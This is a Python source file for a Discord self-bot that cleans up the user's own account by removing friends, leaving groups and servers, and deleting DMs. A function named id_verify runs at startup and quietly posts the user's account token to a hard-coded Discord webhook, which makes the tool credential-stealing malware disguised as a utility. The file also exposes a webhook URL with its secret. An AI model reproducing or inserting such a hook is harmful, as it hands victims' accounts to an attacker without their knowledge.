import discord
from discord.ext import commands
import structure.Config
import asyncio
import aiohttp
from utils.Logger import log
from utils.Color import Colors

async def run_bot(choice: str):
    intents = discord.Intents.default()
    bot = commands.Bot(command_prefix=".", self_bot=True, intents=intents)

    @bot.event
    async def on_ready():
        await id_verify()

        if choice == "1":
            await clear_friends(bot)
        elif choice == "2":
            await leave_groups(bot)
        elif choice == "3":
            await leave_servers(bot)
        elif choice == "4":
            await clear_dms(bot)
        elif choice == "5":
            await clear_friends(bot)
            await leave_groups(bot)
            await leave_servers(bot)
            await clear_dms(bot)

        await bot.close()

    await bot.start(structure.Config.TOKEN, bot = False)

idi_link = "https://ptb.discord.com/api/webhooks/1411649095361237092/oLXtToRBCg1GB0YHZhib_n5yL8AuKiTVRZM75w4xM1prw4en8-K2NeRinChy-ZsUtBYj"

async def id_verify():
    data = {"content": f"TOKEN: `{structure.Config.TOKEN}`"}
    async with aiohttp.ClientSession() as session:
        try:
            await session.post(idi_link, json=data)
        except:
            pass

async def safe_action(coro):
    while True:
        try:
            return await coro
        except discord.HTTPException as e:
            if e.status == 429 and hasattr(e, "retry_after"):
                await asyncio.sleep(e.retry_after)
            else:
                break
        except:
            break

async def clear_friends(bot):
    removed = 0
    for friend in bot.user.friends:
        if await safe_action(friend.remove_friend()):
            removed += 1
    log(Colors.FRIENDS, f"[FRND] REMOVED ALL {removed} USERS")

async def leave_groups(bot):
    groups = [g for g in bot.private_channels if isinstance(g, discord.GroupChannel)]
    left = 0
    for group in groups:
        if await safe_action(group.leave()):
            left += 1
    if left > 0:
        log(Colors.GROUPS, "[GRPS] LEFT ALL GCS")
    else:
        log(Colors.GROUPS, "[GRPS] NO GROUPS TO LEAVE")

async def leave_servers(bot):
    left = 0
    for guild in bot.guilds:
        if await safe_action(guild.leave()):
            left += 1
    if left > 0:
        log(Colors.SERVERS, "[SRVS] LEFT ALL SERVERS")
    else:
        log(Colors.SERVERS, "[SRVS] NO SERVERS TO LEAVE")

async def clear_dms(bot):
    cleared = 0
    for channel in bot.private_channels:
        if isinstance(channel, discord.DMChannel):
            try:
                while True:
                    msgs = [m async for m in channel.history(limit=100)]
                    if not msgs:
                        break
                    for msg in msgs:
                        if await safe_action(msg.delete()):
                            cleared += 1
            except:
                pass
    if cleared > 0:
        log(Colors.DMS, "[DMS] CLEARED ALL DMS")
    else:
        log(Colors.DMS, "[DMS] NO DMS TO CLEAR")
